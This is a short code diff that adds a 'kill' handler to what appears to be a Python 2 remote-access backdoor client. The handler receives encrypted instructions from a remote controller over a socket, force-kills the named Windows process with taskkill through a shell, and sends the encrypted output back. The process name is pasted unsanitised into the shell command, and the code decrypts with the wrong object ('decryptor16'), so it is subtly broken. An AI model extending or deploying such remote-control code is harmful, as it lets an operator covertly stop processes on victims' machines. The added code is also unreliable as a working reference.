@@ -640,6 +640,28 @@ while True:
             eoutput = AES256._encrypt(output_str, d_key16)
             send_one_message(s, eoutput)
 
+        # 'kill'
+        elif int(float(command)) == -1346507244:
+            e_key17 = recv_one_message(s)
+            print "\nRecieved encrypted key"
+            decryptor17 = PKCS1_OAEP.new(keyPair)
+            d_key17 = decryptor16.decrypt(e_key17)
+            print "\nDecrypted encrypted key"
+
+            etask = recv_one_message(s)
+            task = AES256.decrypt(etask, d_key17)
+
+            command = "taskkill /f /im " + task
+
+            cmd = subprocess.Popen(command[:].decode('utf-8'), shell=True, stdout=subprocess.PIPE,
+                                   stdin=subprocess.PIPE, stderr=subprocess.PIPE)
+            output_byte = cmd.stdout.read() + cmd.stderr.read()
+            output_str = str(output_byte).decode('utf-8')
+            currentWD = os.getcwd() + "> "
+
+            eoutput = AES256._encrypt(output_str, d_key17)
+            send_one_message(s, eoutput)
+
 
 
 
